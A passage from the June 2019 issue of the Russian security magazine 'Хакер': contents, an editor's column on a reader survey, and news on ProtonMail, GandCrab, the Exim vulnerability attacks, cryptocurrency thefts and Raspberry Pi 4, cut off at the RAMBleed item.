

                                               Июнь 2019
            № 243
CONTENTS

   О чем пишет (и не пишет) «Хакер»
  Колон ка главреда

    MEGANews
  Всё новое за последний месяц

    Лови сиг нал!
  Исполь зуем SDR, что бы перехватить и расшифровать сигнал пульта

    Лови сиг нал!
  Учим ся передавать сигнал и управлять чужой тех никой

    Как работают антивирусы
  Ме тоды детектирования вредоносных программ

    Поймать нарушителя!
  Учим ся детектировать инс трумен ты атак на Windows

     Уг нать дрон
  Ме тоды перехвата управления коптерами

    Комбо для Drupal
  Как захватить сайт с Drupal, используя новые уяз вимости

    Кибервой ны пер сидского залива
  Как иран ские хакеры обратили интернет про тив его создателей

    Укрощение Kerberos
  Захватыва ем Active Directory на виртуальной машине с HackTheBox

    Самая небезопас ная ОС
  Как популярность iOS ста вит ее пользователей под угрозу

    Справоч ник анонима
  Как пра вильно шиф ровать почтовую переписку, что бы ее никто не прочел

    Тише воды, ниже травы
  Что и как сливают гуглофоны

    Мейкерство на максимал ках
  За водим и разгоня ем оперативную память на STM32 и Arduino

    You CAN
  Превращаем телефон в панель приборов авто мобиля

    Защищаем поч товый сервер без антивируса
  Настройка DKIM‐, SPF‐ и DMARC‐записей

    Хит рый пин гвин
  Нестандартные трюки, которые помогут настроить сеть в Linux

    Загадочный IPsec
  Все, что ты хотел узнать об IPsec, но не догадывался спросить

    Обороняем порт
  Как защитить инфраструктуру на Docker минимальными силами

    Криптовой ны Дикого Запада
  Как АНБ однажды хотело ввес ти тотальную прос лушку, но проиграло

    3D‐сканирование без 3D‐ска нера
  Как получить трехмерную модель при помощи смар тфона

     Тит ры
  Кто дела ет этот журнал
HEADER


  О ЧЕМ ПИШЕТ
   (И НЕ ПИШЕТ)
    «ХАКЕР»

         КОЛОНКА ГЛАВРЕДА





Еще один месяц позади, а это зна чит, ваш
почти что новый глав ный редактор должен
сесть и сочинить еще одну колонку — как и
обещал. Справится ли он с задачей? Какие
темные секреты редакции он раскро ет?       Андрей Письменный                                                                                      Главный редактор
Сколько раз он отвлечется, чтобы решить         apismenny@gmail.com
дела      государственной     важности
или почитать «Твиттер»? Сейчас узнаем!


Предыдущее обращение к читателям я писал в качестве эксперимента, и он,
на мой взгляд, впол не удался. Комментарии на стра нице по длине серьезно
перевешивают сам текст, а это зна чит, что главная цель выполнена и диалог
начался.
   Что разговор обязательно зайдет о бумаж ном «Хакере», можно было
не сомневаться (имен но поэто му я и решил опередить комментаторов и упо‐
мянуть о нем первым). Спа сибо всем, кто обещает поддержать выпуск
«бумаги» и покупать ее за большие деньги. Это не может не вдохновлять!
  Тем не менее сейчас все силы редакции сос редоточены на том, чтобы
ежедневно поставлять статьи для сайта. Именно о них и поговорим. Хоть
у нас и есть общее представление, какие материалы нравятся читателям,
никогда не помешает проверить свои убеж дения.
  Недавно мы выслали тысяче случайно выб ранных подписчиков небольшой
опросник, где попросили рас сказать, насколько люди довольны подпиской,
как изменилось качество статей за пос ледний год, и добавили откры тый воп‐
рос о том, чего им не хва тает в «Хакере».
   Что результаты окажутся такими позитивными, я и мечтать не мог. 89%
читателей оценивают удовлетво ренность подпиской на семь и более баллов
из десяти.





     Оценка удовлетво ренности подпиской по десятибалльной шкале

Тех, кто считает, что качество материалов возросло с прошлого года, втрое
больше, чем тех, кто находит, что ста ло хуже.





   Как изменилось качес тво материалов по сравнению с прошлым годом

Но интереснее всего, конечно, было почитать, что люди писали в текстовом
поле, где мы попросили рас ска зать, какие материалы бы повысили ценность
подписки.
  Выделив общие темы среди просьб, мы сно ва были приятно удивлены:
среди лидирующих ответов — «все и так хорошо». Наравне с ним — поболь‐
ше писать про софт и в особенности про Linux. Постараемся учесть! Хотя
по моим субъективным ощущениям, забывать мы стали скорее о Windows.
Linux и «Мак» в редакции давно победи ли, и некоторый перекос в их сторону
выходит сам собой.
  Занятно, что одни читатели просят побольше статей начального уровня,
которые помогли бы обрести фундаментальные знания, дру гие тем временем
жаждут хардкора. Вооб ще говоря, мы, хоть и ори ентируемся на середину,
стараемся не забывать и про кра ешки.
   Статьи начального уровня о том, как обезопа сить личные данные и сох‐
ранить анонимность в Сети, мы решили объеди нить в цикл «Справочник ано‐
нима» и публиковать бес платно (то есть читать их на сайте можно, не имея
подписки). Последняя из них посвящена защите электронной почты, в ней ты
найдешь ссылки на предыдущие.
  Параллельно мы ста раемся дать широкому кру гу читате лей азы computer
science — они пригодят ся любому программис ту, хакеру и админу. Одна
из таких статей — «Основы цифровой схемотехники» вышла совсем недавно.
С подобными экскурсами мы планиру ем заг лянуть и в дру гие смежные с ИБ
области.
   Что до хардкора, то мы и так ста раемся не проходить мимо важных вещей
и всегда публиковать глубокие материалы о безопасности, когда есть малей‐
шая возможность их заполучить. А вот если тема узкая и прямого отношения
к ИБ не имеет, то здесь мы можем притормозить и спросить у себя: «А есть ли
такому место в „Хакере“?»
  Лайтовые статьи не по нашей основной теме помогают расширить кру‐
гозор, а вот сложные, которые вмес то обзорной экскурсии грузят читателя
подробностями, для этого годятся пло хо. Если 99% людей после второго
абзаца поймут, что орешек им не по зубам, да и грызть его незачем, то, воз‐
можно, от такого материала стоило отка зать ся.
   Часто среди просьб мелькала тема практики взлома. Что ж, справедливо!
Это именно то, за чем сюда пришло большинс тво из вас (да и нас тоже),
ведомых любопытством или иными мотива ми. Однако если на заре двух‐
тысячных в «Хакере» спо койно публиковали отчеты о реальных кейсах, то
теперь с этим уже не так просто.
  Логичная замена — статьи, написанные экспертами по безопасности,
перешедшими на светлую сторону. И такие материалы у нас есть, но, во‐пер‐
вых, их массовое производс тво затруднено тем, что бегать за важными спе‐
цами и заставлять их писать статьи непросто (финансовая мотивация тут сла‐
бо помогает), а во‐вторых, их интересы силь но эволюционировали.
  Защита компаний и ее проверка на прочность, организационные и юри‐
дические вопросы и про чие корпоративные заморочки — все это здорово,
но никак не заменяет статьи об (условно) искусс тве подстановки кавычек
в веб‐формы. А об этом гос подам экспертам писать уже скучновато. Счастли‐
вое исключение — aLLy, который неус танно каждый месяц разбирает для нас
по одному‐два новых экс пло ита.
  Потенциальная альтернатива — райтапы по решению заданий с CTF.
Понятно, что эти задачи составлены искусственно и серьезно отличаются
от того, что бывает в реальных усло виях, но техники, инструментарий и общая
проблематика здесь те же. В июне мы опуб ликовали райтап «Укрощение Ker‐
beros. Захватываем Active Directory на вир туаль ной машине с Hack The Box»,
и он имел немалый успех. Будем продолжать в том же духе!
   Также результаты опро са в очередной раз подтвердили нашу догадку
о том, что в глазах читателей между стать ями и новос тями нет такой дра‐
матичной разницы, какую мы видим с изна ночной сто роны. Есть подоз рение,
что это недопонимание и стало причиной пары попавшихся мне обвинений
в большом количестве «переводных» и слишком легких материалов.
  Наши новости действительно пишут ся в основном по западным источни‐
кам (со ссылкой на них), маркирова ны ярлыком «новость» и публику ются бес‐
платно. Еще один важный момент — их не читает корректор до тех пор, пока
они не попадут в ежемесячную подборку Meganews.
  И то, что новости «Хакера» иногда путают с большими статьями, и то, что
мы пока не погребены под горой жалоб на опечатки, — это, на мой взгляд,
сплошные комплименты нашему новостному редактору Марии Нефёдовой.
Тем не менее, встретив опечатку, смело сооб щай о ней, мы обязательно поп‐
равим!
  Напоследок еще одна очень важ ная вещь, о которой я обязан напоминать
время от времени. Если, прочитав все это, ты вспомнил, что мы что‐то упус‐
тили и упорно не пишем о важной теме, не стес няй ся оповес тить нас об этом.
  А еще лучше, если ты захочешь написать сам. Помимо того что пуб‐
ликоваться у нас круто и престижно, мы выплачива ем гонорар и даем скидки
на подписку, а для постоянных авторов она и вовсе бес платна. Нужно будет
написать хотя бы три статьи, но мой опыт подсказывает: после первой идет
уже значительно легче.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ПОДОЗРИТЕЛЬНЫЙ
PROTONMAIL
В середине мая текущего года с докладом на конференции по безопасности
выступил руководитель швейцарского Центра по вопросам киберпреступнос‐
ти, прокурор Стефан Уолдер (Stephan Walder). Его выступление в реальном
времени транслировал в Twitter швейцарский адвокат Мартин Штайгер (Mar‐
tin Steiger).
   Согласно твитам Штайгера, во время выступления Уолдер прямо заявил
о том, что компания ProtonMail предлага ет свою помощь властям и доб‐
ровольно сле дит за своими пользователями едва ли не в реальном времени,
не требуя для этого ордер из федерального суда. В итоге Штайгер опуб‐
ликовал пост в своем блоге, где детально рас ска зал о том, как именно
ИТ‐компании (в соот ветствии со швейцарским законодательством) должны
сотрудничать с органами власти.
  И хотя ProtonMail — это защищенный сервис со сквоз ным шиф рованием
и фактическое содержание электронных писем клиентов администрация
знать не может, разработ чики все же имеют доступ к метаданным. Приводя
в пример практику Агентства национальной безопасности США, Штайгер
отметил, что метаданные тоже могут быть крайне ценны для правоох‐
ранительных органов и спецслужб.
  Штайгер подчеркивает, что ProtonMail базируется в Швейцарии и исполь‐
зует это в качестве маркетингового преимущес тва, ссылаясь на строгие
швейцарские законы о конфиденциальнос ти. Но фактичес ки сервис подчиня‐
ется местным законам и, по сло вам Уол дера, яко бы и вовсе добровольно
помогает правоохранительным органам.
   Когда на публикацию Штайгера обратили внимание сообщество и СМИ,
Стефан Уолдер связался с юристом и заявил, что тот неправильно цитирует
слова о ProtonMail, однако Штайгер убеж ден, что вовсе не ошибся.
  В итоге на зарождающийся скандал были вынуждены отре агировать
и сами представители ProtonMail. В компании уверяют, что дей ствительно
соблюдают законы Швейцарии, но не в разрез с правилами самого сервиса,
а информация правоох ранительным органам предос тавля ется только в рам‐
ках рассле дований по уголовным делам и исклю чительно при наличии орде‐
ра. И конечно, никто не следит за пользователями превентивно. «Заявление
о том, что мы делаем это добровольно, полностью ложно», — говорит адми‐
нистрация сервиса.
  Нужно сказать, Мартин Штайгер по‐прежнему уверен в своей правоте
и считает, что представители компании ответили не на все вопросы, которые
он поднял в своей статье. Более того, Штайгер сообщает, что представители
ProtonMail пригрозили ему иском за клевету.


WANNACRY ЗАРАЖЕНЫ ДЕ СЯТКИ ТЫСЯЧ МАШИН
Со времени нашумевшей эпидемии WannaCry прошло уже два года, но, как показывают иссле‐
дования, шифровальщик по‐прежнему встречается на множес тве устройств.

Эксперты компании Armis подсчитали, что за пос ледние полгода WannaCry заразил 145 000
устройств в 103 странах мира.

По данным аналитиков, малварь до сих пор присутс твует на 60% про мыш ленных предприятий
и в 40% медицинских учреждений, а также встречается в сетях розничной торговли. Дело
в том, что именно в этих областях используется специализированное оборудование со встро‐
енной Windows, которое слож но обновлять, и апгрейд зачастую выливается в накладные прос‐
тои.

По количеству жертв лидируют США, Вьетнам и Турция: в каждой из этих стран эксперты
еженедельно фиксировали свыше 100 000 обращений к домену‐«рубильнику», останавлива‐
ющему атаку шифровальщика.

Россия заняла в списке экспертов 8-е место с показателем 50 000 обращений.





GANDCRAB ВСЁ
Операторы RaaS (Ransomware as a Service) GandCrab объ явили, что отходят
от дел. Соответствующее заявление было сделано в официальной ветке
известного хакерского форума, где GandCrab рекламировался с самого
момента появления в 2018 году.





В своем послании разработчики GandCrab похвастались, что собираются
«уйти на заслуженную пенсию», так как в общей слож ности выкупы принесли
преступникам более 2 миллиардов долларов и операторы получали пример‐
но 2,5 миллиона дол ларов в неделю (150 миллионов долларов в год). Экспер‐
ты в области безопасности схо дятся во мнении, что эти цифры вряд ли соот‐
ветствуют действительности.



     «Мы успешно обна личили эти деньги и легализова ли их в раз личных
     сфе рах биз неса, как в реальной жиз ни, так и в интерне те. Мы уходим
      на зас луженную пенсию. Мы доказа ли, что можно творить злодеяния,
      но воз мездие не придет», — пишут соз датели GandCrab.

Хуже того, разработчики GandCrab заявили, что вмес те с закрытием сервиса
они намере ны удалить все ключи дешифрования, то есть вос становить файлы
пострадав ших станет невозможно. Неизвестно, пыта ются ли создатели шиф‐
ровальщика таким образом запугать пос тра давших и побудить их заплатить
выкупы или же в самом деле планируют уничтожить ключи. Стоит заметить,
что, отходя от дел, разработчики дру гих шифровальщиков (например, Tes‐
laCrypt, XData и Crysis), напротив, публикова ли оставшиеся ключи в открытом
доступе, чтобы жертвы могли вос становить данные.
  Но к счастью для пользователей, вскоре пос ле объ явле ния о грядущем
закрытии GandCrab эксперты компании Bitdefender, Европола и ФБР предста‐
вили новый инструмент для дешифровки данных. Это решение работает даже
для новейших версий GandCrab 5.0 и GandCrab 5.2, а также для более старых
версий 1, 4.
  Напомню, что GandCrab был одним из наиболее активных вымогателей
на рынке весь последний год. Так, эксперты компании Bitdefender уже трижды
выпускали инструменты для дешифровки фай лов после атак GandCrab (1, 2,
3). Эти бесплат ные инс трументы, по словам Bitdefender и правоохранитель‐
ных органов, помогли более чем 30 тысячам жертв шифровальщика и пре дот‐
вратили выплату злоумышленникам более 50 миллионов дол ларов. Однако
весь прошедший год вымогатель продолжал активно обновляться и совер‐
шенствоваться, после чего дешифровщики переставали работать.





           История обновлений GandCrab и релизы дешифровщиков

Новейший дешифровщик был выпущен Bitdefender в сотрудничестве с Евро‐
полом, румынской  полицией,  DIICOT, ФБР, Национальным  агентством
по борьбе с преступностью Великоб ритании, а также дру гими европейскими
правоохраните лями. Инс тру мент дос тупен для загрузки на сайте Bitdefender
Labs, а также в рамках про екта No More Ransom.
   Равно как и в предыду щих случаях, инстру мент для расшифровки появился
не потому, что обнаружилась какая‐то брешь в алгоритме шифрования.
Вместо этого Bitdefender, в сотрудничес тве с пра воохранительными орга‐
нами, получила доступ к управляющим серверам GandCrab, и эксперты
извлекли клю чи дешифрования, необ ходимые для расшифровки фай лов
жертв.


В РОСКОМНАД ЗОРЕ НЕДОВОЛЬНЫ
Как сообщил журналистам ТАСС глава РКН Александр Жаров, он по‐прежнему недоволен тем,
что фильтрация запрещенного контента в Google остается на уровне око ло 68–70%.





→«Мы уже в процессе составления [протокола], административное дело находится в процес‐
се развития, поскольку ситуация с фильтрацией запрещенного трафика компании Google
не меняется. Грозит им [корпорации Google] штраф в 700 000 рублей. Думаю, до кон ца июля
точно уже все формальные процедуры пройдут: сос тавление про токо ла, приглашение предста‐
вителя компании на протокол. Но вдруг Google все исполнит. Мы стремимся к тому, чтобы
закон был исполнен, а не штрафовать»
— Александр Жаров





MANIFEST V3
Как мы  уже  неоднократно  рас ска зывали,  вокруг  грядущего  Manifest
V3 по‐прежнему ведутся жаркие споры. Напомню, что блокировщики контента
и другие расширения для Chrome могут пос тра дать из‐за изменений,
которые инже неры Google планиру ют внес ти в третью версию манифес та,
определяюще го возможнос ти и ограничения для расширений.
   Суть проблемы заключа ется в том, что в Google намере ны ограничить
работу webRequest API, а это может негативно сказаться на функционирова‐
нии блокировщиков контента и не только. Вмес то webRequest разработчикам
будет предложено использовать declarativeNetRequest API, и, по словам мно‐
гих девелоперов, переход на другой API, сильно отличающийся от webRe‐
quest и во многом ему усту пающий, в сущности, ста нет «смертью» их продук‐
тов.
  По данным на конец мая 2019 года, раз работчики Google решили, что
функциональность webRequest останет ся преж ней только для корпоративных
клиентов, а для остальных API будет огра ничен, как и планировалось ранее.
Это известие немедленно дало толчок новому витку споров и критики.
  Но не стоит забывать и о том, что релиз Manifest V3 повлияет на кодовую
базу Chromium в целом, то есть изменения затронут и другие браузеры. Спе‐
ша успокоить своих пользователей, разработчики Opera, Brave и Vivaldi уже
сообщили официально, что не намерены поддерживать взятый Google курс
на борьбу с бло кировщиками.
   Так, журналисты изда ния ZDNet свя зались с главой Brave Software Брен‐
даном Эйхом (Brendan Eich), и тот заверил, что Brave продолжит поддержи‐
вать webRequest для всех расширений. В частнос ти, по‐прежнему будут
работать uBlock Origin и uMatrix, соз данные Реймондом Хиллом — в нас‐
тоящее время главным критиком гря дущих изменений в Manifest V3. Также
Эйх напомнил, что в браузере компании есть встроенный блокировщик рек‐
ламы, который можно использовать в качес тве альтернативы любому рас‐
ширению.
  Представите ли ZDNet поговорили и с разработ чиками Opera, которые
тоже сообщили, что столь необходимые блокировщикам API, скорее всего,
продолжат работать в Opera (невзирая на то что в Chrome они отключатся).
К тому же во всех вер сиях Opera тоже есть собс твенный блокировщик рек‐
ламы, и в худшем случае пользователи всег да могут переключиться на него.
  Девелоперы  Vivaldi в официальном блоге уточнили, что все зависит
от того, как имен но Google реализует ограничения. Однако в компании
пообещали в любом случае предоставить поль зователям выбор. Разработ‐
чики пишут, что существует множес тво возможных сценариев реагирования
на третью версию манифеста, включая даже восста новление функциональ‐
ности API — а это команде Vivaldi уже приходилось делать ранее. Если же API
удалят полностью, разработ чики обещают рас смот реть альтернативы, вплоть
до создания катало га ограниченных расширений.



      «Хорошая новость зак люча ется в том,  что, какие бы огра ниче ния
      ни наложила Google, в конеч ном итоге мы сможем их снять. Наша
     мис сия всегда сос тоит в том, чтобы у вас был выбор», — пишут пред-
      ста вите ли Vivaldi.

Единственный браузер, разработчики которо го пока не обозначили свою
позицию по отношению к гря дущему Manifest V3, — это Edge компании Mi‐
crosoft. Напомню, что о переводе Edge с движка EdgeHTML на Chromium было
объявлено  в  конце прошлого  года,  в  настоящее  время  уже вышла
превью‐версия обновленного бра узера.


ОПАСНЫЕ «ЧИСТИЛЬЩИКИ»

Эксперты «Лаборатории Касперского» зафиксировали двукратное уве личе ние числа поль‐
зователей, столкнувшихся с hoax system cleaners — прог раммами для очистки компьюте ра
и оптимизации его работы, которые специально пугают жертву лож ной информацией о критич‐
ности состояния ее устрой ства и вынуждают жертву платить за избавле ние от проблем.


В первой половине 2019 года загрузить на свои устройства такие утилиты пытались почти
1,5 миллиона пользователей. В аналогичном периоде 2018 года этот показатель был зна‐
чительно меньше — 747 000 пользователей.





В первой пятерке стран, чьи пользователи в наибольшей степени подвергаются риску постра‐
дать от опасных чистильщиков, оказались Япония  (12% пользовате лей), Германия  (10%),
Беларусь (10%), Италия (10%) и Бразилия (9%).

В России с hoax‐программами столкнулся каждый 11-й пользователь.





EXIM ПОД АТАКАМИ
В начале июня 2019 года исследователи из компании Qualys обнаружили
опасную проблему CVE‐2019‐10149 в почтовом агенте Exim (версии 4.87–
4.91), позволяющую злоумышленникам запус кать команды от имени root
на удаленных почтовых серверах.
   Уязвимость представляет опас ность для полови ны всех почтовых сер‐
веров в интерне те. Дело в том, что, по данным на июнь 2019 года, 57% всех
почтовых серверов (507 389) действительно исполь зуют Exim, а по другим
данным количество установок Exim намного выше — порядка 5,4 миллиона.
  Эксперты предупреждали, что экс плуата ция най денной уязвимости крайне
проста, и прогнозировали, что зло умыш ленники соз дадут эксплоит для проб‐
лемы за считаные дни. К сожалению, опасения специалистов пол ностью под‐
тверждаются: уязвимость уже используют как минимум две хакерские группы.
  Первую волну  атак обнаружил независимый ИБ‐спе циалист Фредди
Лиман (Freddie Leeman). Ата ки начались 9 июня и исходили с управляющего
сервера, расположенного по адресу http://173.212.214.137/s.
  В последующие дни стоящая за атаками группировка изменяла типы рас‐
пространяемой малвари и скриптов, то есть экспериментировала с атаками
и пока явно не определилась с тем, как лучше экс плуатировать проблему
и обернуть ее себе на пользу.
   Вторая  группировка принялась действовать  параллельно  с первой.
По данным компании Cyren, ата ки начались 10 июня. Эта группа злоумыш‐
ленников поставила своей целью внедрить бэкдор на серверы MTA, загрузив
shell‐скрипт и добавив ключ SSH к root‐аккаунту. Известно, что вторая группа
атакующих сосредотачивает свои усилия на системах Red Hat Enterprise Linux
(RHEL), Debian, openSUSE и Alpine Linux.
  На вторую вол ну атак обра тили внимание и дру гие специалисты, в том
числе из компании Cybereason. Они пишут, что вторая группировка не только
эксплуатирует уязвимость в Exim, но и использует самораспространяющийся
компонент, который, подобно червю, может доставлять экс плоит для Exim
на другие серверы. Кро ме того, хакеры загружают и устанавливают на ском‐
прометированные серверы майнеры криптовалю ты.
  В конце месяца специалисты Microsoft предуп редили, что инфраструктура
Azure также пострадала от это го червя. К счастью, по данным компании, Azure
успешно ограничивает его рас простра нение и не поз воляет «плодиться»
дальше.
  Тем не менее клиентов предос терегают, что дру гая часть малвари
по‐прежнему работает. Хотя червь не сможет самос тоятельно распростра‐
няться, взломанные машины Azure все равно останутся скомпрометирован‐
ными и будут заражены майнером. Он ощутимо замедляет работу инфициро‐
ванных систем, и, хуже того, зло умышленники могут в любой момент уста‐
новить другие вредонос ные программы на виртуальные машины  Azure,
используя ту же уязвимость в Exim.
  Администраторам рекомендуют как можно скорее обновить Exim до вер‐
сии 4.92, чтобы защитить серверы от возможных атак.


ИНКУБАТОРЫ МАЛВАРИ
В этом месяце эксперты компании FireEye подготовили отчет о главных киберугрозах первого
квартала 2019 года. Одним из интересных наблюдений экспер тов оказалось значительное уве‐
личение количества вредоносных файлов, хранящихся в облачных сервисах.

Наибольший прирост малвари наблюдается в Microsoft OneDrive. Так, в первом квартале
количество вредоносных файлов в OneDrive вырос ло сразу на рекордные 60% по срав нению
с 2018 годом.


Как видно на иллюстрации ниже, злоумышленники также нередко используют для раз мещения
малвари Google Drive и Dropbox, однако до «популярности» облачного сервиса Microsoft
этим платформам далеко.





                                     Продолжение статьи →
← Начало статьи





 КРИПТОВАЛЮТНЫЕ
 ВЗЛОМЫ
  За прошедший месяц сра зу нес колько криптовалютных сервисов подвер‐
   глись кибератакам. Некото рые инциденты оказались успешны ми для зло‐
  умышленников, другие же не совсем.


  Взлом ради защиты
  В ходе аудита кошелька Agama, предназна ченного для работы с криптовалю‐
  той Komodo (KMD) и альткойнами, эксперты npm обнаружили опасную уяз‐
   вимость, которая угрожала безопас ности пользователей.
    Иссле дователи заметили вредонос ное обновление в составе библиотеки
   electron‐native‐notify (версия 1.1.6) — после обновления в ее коде появилась
  функциональность для хищения seed'ов кошельков и парольных фраз из крип‐
  товалютных приложений. Эксперты не сра зу поняли, что имеют дело с атакой
  на цепочку поставок: библиотека была нацелена на разработчиков приложе‐
   ния, которые в итоге внедрили ставшую вредоносной библиотеку в свой про‐
   дукт. Как нетрудно понять, этим приложением был кошелек Agama, созданный
  командой Komodo и использующий в работе EasyDEX‐GUI. Именно EasyDEX‐
   GUI, как оказалось, подгружал опасную биб лиотеку electron‐native‐notify.
     Хотя вредоносный код появился в  electron‐native‐notify еще в мар‐
   те 2019 года, в Agama он проник только 13 апреля, с выходом версии Agama
   0.3.5. По данным специалистов npm, код зло умышленни ков функционировал,
   как и было задумано: похищал seed’ы и пароль ные фразы и передавал эти
  данные на удаленный сервер. В итоге операто ры этой кампании получали
  возможность похитить средства пользователей Agama.
     Когда о проб леме  ста ло  известно,  раз работчики Komodo приняли
  решение действовать, срочно обезопасив своих пользователей и их средс‐
   тва. Для этого они сами эксплуатировали ту же самую уязвимость, что и зло‐
  умышленники, в итоге получили в свое распоряжение множество seed’ов,
  а затем вывели все эти средства из‐под уда ра.
     Таким образом с уяз вимых кошельков было спа сено около 8 мил лионов
  токенов KMD и 96 BTC. В противном случае эти средства могли бы украсть
  злоумышленники. Средства были переведены на отдельные кошельки, где,
   как уверяют разработчики, они находятся в пол ной безопас ности и под кон‐
  тролем команды Komodo.
     Теперь пользователи могут запросить возврат своих токенов через спе‐
  циально созданную стра ницу. Также им рекомендуется завести новые адре са
  KMD и BTC, использовать новые seed’ы и пароль ные фразы.


  GateHub
   Увы, пользовате лям кошелька GateHub повез ло меньше. Неизвестные зло‐
  умышленники похитили у пользователей сервиса 23,2 миллиона токенов Rip‐
   ple (XRP), общей стоимостью около 9,5 миллиона дол ларов.
     Согласно официальному заявлению администра ции GateHub, в компании
  полагают, что хакеры каким‐то образом злоупот ребили API кошелька, однако,
   как именно это произошло, не уточняется.



       «Мы зафик сирова ли рост количес тва вызовов  API  (с под линны ми
         токена ми дос тупа), пос тупа ющих от небольшого чис ла IP-адре сов.
        Это могло быть связано с тем, как злоумыш ленник получил дос туп
          к зашиф рованным сек ретным клю чам. Впрочем, это не объясняет,
          как  злоумыш ленник  получил  дру гую  информа цию,  необходимую
         для рас шифров ки клю чей», — пишут раз работчики и уточ няют, что все
         токены были отоз ваны 1 июня 2019 года, а подоз рительные обра-
        щения к API прек ратились.

  Немного больше деталей случившегося мож но найти в неофициальном отче‐
   те команды XRP Forensics. К примеру, исследователям удалось опре делить
  двенадцать XRP‐адресов, на которые зло умышленни ки вывели похищенные
  средства. На момент публикации отчета аналитики проследили путь око‐
  ло 23 200 000 XRP, украденных у 80–90 пользователей. При этом сообщается,
   что преступники уже отмыли через обменники и микшер‐сервисы поряд‐
   ка 13 100 000 XRP.
   О том, как именно была реализована данная ата ка, эксперты XRP Forensics
  тоже не сообщают ничего, так что пользователям остается ждать офи циаль‐
  ного заявления компании, которое будет сделано после завершения внут‐
  реннего расследования.


   Bitrue
  Биржа Bitrue подверглась кибератаке уже во вто рой раз за текущий год.
  В январе 2019 года ресурсу повезло: тогда Bitrue стала жертвой атаки 51%,
   в ходе которой зло умышленники пытались  похитить 13 тысяч токенов
  Ethereum Classic (ETC) на сумму более 100 тысяч дол ларов. Но тогда подоз‐
  рительную активность заметили вовремя и атаку уда лось предотвратить.
     Вторая атака, произошедшая в конце июня, к сожалению, не была обна‐
  ружена вовремя. Неизвес тным зло умышленникам удалось похитить с горяче‐
   го кошелька сингапурской криптовалютной биржи 9,3 миллиона токенов Rip‐
   ple (XRP) и 2,5 миллиона токенов Cardano (ADA) общей стоимостью 4,25 мил‐
  лиона долларов и 225 тысяч долларов соответственно.
     После обна ружения атаки торги на Bitrue сразу же были прекращены,
  и теперь платформа временно не работа ет. Конечно, расследование инци‐
  дента еще далеко от завершения, и практически никаких подробнос тей опуб‐
  ликовано не было, но, по предваритель ным данным, в результате атаки пос‐
   традали около 90 поль зователей.
      Bitrue уже сотрудничает с правоохранительными органами и представите‐
  лями других обменников (Bittrex, ChangeNOW и Huobi), стараясь блокировать
   украденные преступниками средс тва и помешать деньгам окончательно
   затеряться.
     Представите ли биржи  уверяют,  что сей час  ситуация уже находится
  под полным кон тролем, и обещают всем пострадавшим возместить 100%
  потерянных средств.


  БАБЛО ВАЖНЕЕ БЕЗОПАСНОСТИ
   Защитная функция ATS (App Transport Security) была представлена еще в 2015 году, с релизом
   iOS 9, и должна блокировать все небезопасные HTTP‐соединения между приложе нием и его
   удаленным сервером. Изначально Apple собиралась сделать примене ние ATS обязательным
   для всех приложений, однако в конце 2016 года отка залась от этого плана, а использование
   ATS так и осталось необязательным.


   Как показало исследование ком пании Wandera, теперь, три года спус тя, ATS по‐прежнему
   не пользуется популяр ностью у разработчиков.

   Аналитики изучили 30 000 приложений для iOS и установили, что 67,8% из них отключают ATS
   полностью.

   Лишь 27% приложений применяют ATS для пос тоян ного обес печения зашифрован ной связи
   и блокировки незашифрованных HTTP‐соединений.

  Еще около 5,3% приложений используют ATS час тично, отключая функцию для опре деленных
   доменов.





   По мнению исследова телей, такая нелюбовь разработчиков к ATS объ ясняется весьма прос то:
   рекламные платформы и сети очень часто рекомендуют в докумен тации отключать ATS внутри
   приложений, чтобы iOS не блокировала связь с рекламными серверами в слу чае возникно‐
   вения ошибок.


   По статистике, ATS чаще используется в платных приложениях — они не так сильно зависят
   от доходов от рекламы, и у разработчиков нет нужды отключать защиту ради собственной
   выгоды.





 RASPBERRY PI 4
  Разработчики Raspberry Pi Foundation официаль но представили четвертое
  поколение одноплатных компьютеров Raspberry  Pi. Теперь мини атюрные
  «малинки» стали еще мощнее.
     Релиз Raspberry Pi 4 сос тоялся сущес твенно раньше запланированного
  срока, так как компания Broadcom сумела крайне опе ративно запустить
   в производство чипы BCM2711, лежащие в сердце нового гаджета.
    По срав нению со старыми моделями Raspberry Pi 4 значительно изменил‐
  ся и обзавелся сразу нес колькими замет ными новшествами. Основные тех‐
  нические характеристики нового одноплатника таковы:
   • четырехъядер ный  64‐битный  про цес сор  Cortex‐A72  с  поддержкой
     H.264 и H.265 и частотой 1,5 ГГц;
   • оперативная память LPDDR4 SDRAM объемом 1, 2 или 4 Гбайт на выбор;
   • два порта micro‐HDMI с поддержкой двух мониторов и 4K;
   • VideoCore VI GPU с поддержкой OpenGL ESx;
   • поддержка Bluetooth 5.0, два порта USB 3.0 (в допол нение к двум USB 2.0)
     и порт USB Type‐C, заменивший micro‐USB;
   • полноценный Ethernet 1 Гбит/с (USB больше не будет «бутылочным гор‐
     лышком»), Wi‐Fi с под держкой 802.11ac.

  Стоимость новинки напрямую зависит от количества памяти на борту. Так,
  версия с 1 Гбайт ОЗУ сто ит 35 долларов США, а вариации с 2 и 4 Гбайт обой‐
   дутся в 45 или 55 дол ларов соответс твенно.





  Разработчики уверяют, что по производительности Raspberry Pi 4 впол не
  можно срав нить с деcктопами на 32‐битной архитектуре. К при меру, спе‐
  циалисты Tom’s Hardware, уже протестировавшие новинку в деле, пишут, что
  миниатюрный компьютер без тру да справляет ся с такими повседневными
  задачами, как работа с GIMP, Libre Oﬃce, и может без труда открывать пят‐
  надцать вкладок в Chromium‐бра узерах.


  САМЫЙ СЕРЬЕЗНЫЙ ПРОМАХ БИЛЛА ГЕЙТСА
   YouTube‐канал Village Global опубликовал большое интервью с Биллом Гейтсом. Во вре мя
   беседы тот рассказал, что одним из своих самых серьезных про махов считает упущен ную Mi‐
    crosoft возможность на рынке мобильных ОС.





  →«Мир програм много обеспечения (особенно если речь идет о платформах) — это рын ки, где
   победитель забирает все. Поэтому величайшая ошибка, ког да‐либо допущенная из‐за плохого
   управления, в которое я был вовлечен, — это тот факт, что Microsoft не стала тем, чем сейчас
   является Android. То есть Android — это стандартная платформа для телефо нов, помимо Apple.
   Этот [рынок] могла бы естествен ным путем завоевать Microsoft.
      Понимаете, в данном случае победитель действительно забирает все. Если у вас есть
   вдвое меньше приложений, вы находитесь на пороге пол ного краха. На рын ке есть место лишь
   для одной операционной сис темы, помимо Apple. Сколько это стоит? Порядка 400 миллиардов,
   которые могли бы перейти от компании G к компании M»
  — Билл Гейтс





 RAMBLEED
  Сводная группа ученых из США, Авс тра лии и Австрии опубликовала доклад
  о новой вариации атаки на проб лему Rowhammer. Методика получила наз‐
